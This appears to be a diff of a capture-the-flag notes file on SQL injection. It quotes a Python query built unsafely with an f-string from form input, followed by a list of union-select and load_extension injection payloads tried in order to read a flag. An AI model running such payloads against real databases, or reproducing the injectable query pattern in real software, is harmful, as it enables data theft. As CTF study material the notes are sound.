@@ -146,4 +146,9 @@ a%'union select load_extension ('./flag.txt')/*
 -  query = db.execute(f"SELECT password FROM table_{id} WHERE password LIKE '%{request.form['query']}%'")
 -   a%'")\nquery=db.execute("select "1")/* -500
 -   a%'union (select (create table radha(col1 text) as "1"/* -500
-  
+### select flag
+- a%'union select "1"/*
+- a%'union select table_{id}/*-500
+- a%'union select {table_{id}}/* -500
+- a%'union select {id}/* -500
+### https://sites.google.com/site/janbeck/cybersecurity-and-reverse-engineering-fun/ctf-sql-injection
